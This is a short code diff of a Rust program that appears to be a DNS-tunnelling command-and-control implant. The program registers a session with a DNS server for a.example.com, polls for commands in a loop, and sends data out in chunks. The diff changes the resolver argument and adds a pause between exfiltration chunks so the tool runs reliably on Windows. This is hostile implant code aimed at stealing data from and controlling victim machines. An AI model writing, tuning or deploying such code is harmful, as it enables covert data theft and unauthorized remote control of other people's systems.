@@ -13,7 +13,7 @@ fn main() {
     };
 
     let dns = DNS::new(
-        "127.0.0.1:53".to_string(),
+        Some("127.0.0.1".to_string()),
         "a.example.com".to_string(),
         session,
     );
@@ -21,7 +21,7 @@ fn main() {
     match dns.register_session() {
         Ok(_) => println!("Session registered successfully"),
         Err(e) => println!("Error registering session: {}", e),
-    }
+    };
 
     loop {
         match dns.command_info() {
@@ -71,6 +71,7 @@ fn main() {
                                 Ok(_) => {}
                                 Err(e) => println!("Error exfiltrating chunk: {}", e),
                             }
+                            std::thread::sleep(std::time::Duration::from_millis(1)); // being too fast breaks Windows API
                         }
                     }
                     None => {}
